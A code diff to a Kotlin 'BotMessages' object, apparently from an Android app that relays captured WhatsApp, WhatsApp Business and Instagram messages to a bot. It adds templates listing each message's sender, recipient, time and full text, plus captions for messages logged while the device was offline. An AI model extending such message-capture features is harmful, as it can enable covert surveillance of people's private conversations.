@@ -167,6 +167,7 @@ object BotMessages {
         fun buildSocialUpdatesPrompt(context: Context): String {
             val prefs = PrefsManager.getInstance(context)
             val whatsappState = if (prefs.whatsappUpdatesEnabled) "✅ Enabled" else "❌ Disabled"
+            val waBusinessState = if (prefs.whatsappBusinessUpdatesEnabled) "✅ Enabled" else "❌ Disabled"
             val instagramState = if (prefs.instagramEnabled) "✅ Enabled" else "❌ Disabled"
             
             return """
@@ -179,6 +180,7 @@ object BotMessages {
                 *Currently Active Settings*:
                 
                 *WhatsApp*: $whatsappState
+                *WhatsApp Business*: $waBusinessState
                 *Instagram*: $instagramState
             """.trimIndent()
         }
@@ -409,6 +411,14 @@ object BotMessages {
             Here are the remaining entries.
         """.trimIndent()
         
+        fun buildOfflineWABusinessLogCaption(): String =
+                """
+            #WABusiness #Offline
+            ===================
+            ⚠️ *Update* - While the device was offline, WA Business messages were received.
+            Here are the remaining entries.
+        """.trimIndent()
+        
         fun buildOfflineInstagramLogCaption(): String =
                 """
             #Instagram #Offline
@@ -493,6 +503,32 @@ object BotMessages {
             appendLine("#Whatsapp")
             appendLine("===================")
             appendLine("✨ *WhatsApp Update*")
+            appendLine("===================")
+            appendLine("*New Message has been $direction!*")
+            appendLine()
+            appendLine("*Chat Room* : $safeChatName [$safeChatType]")
+            appendLine("*Type* : $direction")
+            appendLine("*Time* : $timeFormatted")
+            appendLine("*From* : $safeSentBy")
+            appendLine("*To* : $safeToTarget")
+            appendLine("===================")
+            appendLine()
+            appendLine("*Message* :")
+            append(safeMsg)
+        }
+
+        fun buildWABusinessMessage(
+                safeChatName: String,
+                safeChatType: String,
+                direction: String,
+                timeFormatted: String,
+                safeSentBy: String,
+                safeToTarget: String,
+                safeMsg: String
+        ): String = buildString {
+            appendLine("#WABusiness")
+            appendLine("===================")
+            appendLine("✨ *WA Business Update*")
             appendLine("===================")
             appendLine("*New Message has been $direction!*")
             appendLine()
